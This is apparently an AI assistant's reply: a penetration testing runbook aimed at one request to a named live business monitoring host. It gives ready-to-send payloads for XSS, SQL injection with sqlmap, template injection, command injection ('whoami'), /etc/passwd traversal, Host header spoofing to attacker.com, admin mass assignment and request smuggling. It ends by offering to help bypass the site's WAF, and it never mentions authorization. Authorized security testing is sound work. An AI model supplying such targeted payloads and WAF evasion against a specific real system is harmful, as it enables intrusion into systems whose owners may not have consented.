# Data-Input-Validation

**real pentester runbook**

We’ll use:

* **Burp Suite** (main tool)
* Browser DevTools (for frontend/DOM)
* Optional: curl (quick replay)

---

# INITIAL SETUP (DO THIS ONCE)

## Tool: Burp Suite

### Steps:

1. Open Burp → **Proxy → Intercept ON**
2. Open browser through Burp
3. Perform the action (dashboard load)
4. Capture your request
5. Right-click → **Send to Repeater**

---

## In Repeater:

* You’ll see:

  * Request (left)
  * Response (right)

Right-click tab → **Duplicate tab**
Use one tab per vulnerability

---

# 1. STORED XSS (START HERE — highest chance)

## Tool:

* Burp Repeater + Browser

## Where to edit:

Find in request body:

```json
"name":"HOST NAME"
```

## Replace with:

```json
"name":"<svg/onload=alert(1)>"
```

## Steps:

1. Click **Send** (in Repeater)
2. Go to browser
3. Refresh dashboard page

## Result:

* ❌ FAIL → alert pops
* ✅ PASS → no execution

---

# 2. REFLECTED XSS

## Tool:

* Burp Repeater

## Replace:

```json
"name":"\"><script>alert(1)</script>"
```

## Steps:

1. Click **Send**
2. Look at **response panel (right side)**

## Result:

* ❌ FAIL → `<script>` appears raw
* ✅ PASS → encoded (`&lt;script&gt;`)

---

# 3. DOM XSS

## Tool:

* Browser DevTools

## Steps:

1. Inject:

```json
"name":"\"><img src=x onerror=alert(1)>"
```

2. Send request
3. Open browser → press **F12**
4. Go to:

   * **Elements tab**
   * **Sources tab**

## What to look for:

* JS inserting your payload

## Result:

* ❌ FAIL → alert triggers via JS
* ✅ PASS → safe rendering

---

# 4. SQL INJECTION

## Tool:

* Burp Repeater

## Modify:

```json
"dashboardid":"402"
```

## Replace:

```json
"dashboardid":"402 OR 1=1"
```

## Steps:

1. Send request
2. Compare response with baseline

## Look for:

* Errors
* More data
* Different response size

## Optional confirm:

```bash
sqlmap -r request.txt
```

---

# 5. SSTI (Server-Side Template Injection)

## Tool:

* Burp Repeater + Browser

## Modify:

```json
"name":"{{7*7}}"
```

## Steps:

1. Send request
2. Refresh dashboard

## Result:

* ❌ FAIL → shows `49`
* ✅ PASS → shows `{{7*7}}`

---

# 6. COMMAND INJECTION

## Tool:

* Burp Repeater

## Modify:

```json
"name":"test; whoami"
```

## Steps:

1. Send request

## Look for:

* Command output
* Delay

---

# 7. FILE INCLUSION (LFI)

## Tool:

* Burp Repeater

## Modify:

```json
"name":"../../../../etc/passwd"
```

## Steps:

1. Send request

## Result:

* ❌ FAIL → file content appears
* ✅ PASS → blocked

---

# 8. HTTP PARAMETER POLLUTION (HPP)

## Tool:

* Burp Repeater

## Modify:

```json
"dashboardid":"402",
"dashboardid":"999"
```

## Steps:

1. Send request

## Look for:

* Which value is used?

---

# 9. MASS ASSIGNMENT

## Tool:

* Burp Repeater

## Add inside JSON:

```json
"is_admin": true
```

## Steps:

1. Send request

## Look for:

* Role/behavior change

---

# 10. FORMAT STRING INJECTION

## Tool:

* Burp Repeater

## Modify:

```json
"name":"%x%x%x%x"
```

## Steps:

1. Send request

## Look for:

* Memory leakage / strange output

---

# 11. HOST HEADER INJECTION

## Tool:

* Burp Repeater

## At top (headers):

Replace:

```http
Host: enterprise-monitoring.safaricombusiness.co.ke
```

With:

```http
Host: attacker.com
```

## Steps:

1. Send request

## Look for:

* Reflected URLs
* Redirects

---

# 12. HTTP SMUGGLING

## Tool:

* Burp Repeater

## Add headers:

```http
Transfer-Encoding: chunked
Content-Length: 10
```

## Steps:

1. Send request multiple times

## Look for:

* Delays
* Inconsistent responses

---

# 13. OVERFLOW TEST

## Tool:

* Burp Intruder

## Steps:

1. Send request to **Intruder**
2. Select:

```json
"name":"HOST NAME"
```

3. Add payload:

```
AAAAA...(10,000+ chars)
```

4. Start attack

## Look for:

* Crash
* Errors

---

# 14. SSRF (NOT APPLICABLE HERE)

👉 Your request has no URL input
Skip unless you find:

* `url`
* `endpoint`
* `callback`

---

# 15. XML / LDAP / XPath / SMTP

👉 Not applicable to THIS JSON request
(Only test if:

* XML endpoints
* login/auth systems
* email features)

---

# 🧠 FINAL WORKFLOW (THIS IS HOW YOU EXECUTE CLEANLY)

## In Burp:

* Repeater → manual testing
* Intruder → fuzzing

## In Browser:

* DevTools → DOM XSS

---

## Order to follow:

1. Stored XSS
2. Reflected XSS
3. DOM XSS
4. SSTI
5. SQLi
6. Command Injection
7. Mass Assignment
8. HPP
9. Others

---

I can:

* Show you **how to confirm stored XSS properly (no false positives)**
* Help you **bypass WAF (Incapsula is in your headers)**
* Or walk you through **turning a finding into a high/critical report**

Just tell me 👍
